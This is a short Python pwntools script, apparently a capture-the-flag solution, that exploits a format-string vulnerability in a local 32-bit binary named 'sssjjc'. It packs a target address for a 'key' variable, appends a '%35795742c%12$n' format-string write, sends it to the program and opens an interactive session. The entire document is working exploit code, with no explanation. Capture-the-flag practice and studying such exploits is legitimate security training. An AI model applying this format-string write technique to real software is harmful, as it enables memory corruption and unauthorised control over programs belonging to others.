from pwn import *
context.update(arch='i386',os='linux',log_level='debug',endian='little')
p=process('./sssjjc')
key_addr=0x0804A048
payload=p32(key_addr)+'%35795742c'+'%12$n'
p.sendline(payload)
p.interactive()

